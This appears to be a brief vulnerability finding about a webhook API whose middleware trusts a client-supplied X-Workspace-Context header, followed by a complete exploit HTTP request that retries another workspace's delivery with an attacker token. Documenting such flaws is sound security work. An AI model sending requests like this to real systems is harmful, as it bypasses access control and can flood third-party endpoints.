diagnosis: Middleware trusts client header X-Workspace-Context without validating caller's membership in that workspace. Any user can pass another workspace's ID in the header alongside a brute-forced or intercepted delivery_id to trigger redundant webhook retries and flood external endpoint targets.
exploit_request:
POST /api/v1/webhooks/deliveries/deliv_77492a/retry HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
X-Workspace-Context: ws_prod_enterprise_core
